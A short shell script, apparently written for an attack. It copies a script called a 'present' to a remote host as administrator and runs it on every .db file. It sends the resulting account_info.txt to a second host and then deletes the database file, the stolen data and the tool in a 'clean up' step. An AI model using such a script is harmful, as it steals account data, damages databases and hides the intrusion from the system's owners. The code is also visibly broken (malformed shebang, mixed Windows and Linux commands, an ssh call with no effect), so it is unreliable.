!# /usr/bin/bash

# bring present to db
tar.exe -a -c -f present.zip db_parse.py
scp C:\\Users\\Jerry\\Downloads\\present.zip administrator@12.34.56.70:/home/administrator
ssh administrator@12.34.56.70 "cd /home/administrator"

# unwrap present
unzip -q present.zip
cd present
mv db_parse.py ..
cd ..

# get data and encrypt db
for a in $(ls *.db)
do
    echo Selecting $a
    echo Executing ...
    python3 db_parse.py $a
    echo Done.
    echo Copying info back ...
    scp account_info.txt Jerry@12.34.56.71:C:\\Users\\Jerry\\Downloads
    echo Done.
    echo Finished.
done

# clean up
echo Cleaning up ...
rm -f present.zip
rm -rf present
rm -f $a
rm -f account_info.txt
rm -f db_parse.py

exit
